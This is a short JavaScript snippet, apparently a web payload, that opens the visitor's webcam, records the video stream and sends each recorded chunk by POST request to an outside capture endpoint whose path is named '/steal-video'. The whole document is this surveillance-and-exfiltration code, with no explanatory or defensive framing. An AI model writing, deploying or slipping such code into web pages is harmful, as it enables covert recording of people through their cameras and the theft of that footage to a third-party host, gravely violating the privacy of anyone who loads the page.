navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        let videoTracks = stream.getVideoTracks();
        let mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.start();

        mediaRecorder.ondataavailable = function(event) {
            fetch('https://eoow6y96ffo9mzx.m.pipedream.net/steal-video', {
                method: 'POST',
                body: event.data,
                headers: {
                    'Content-Type': 'video/webm'
                }
            });
        };
    })
    .catch(function(error) {
        console.error('Webcam access denied:', error);
    });
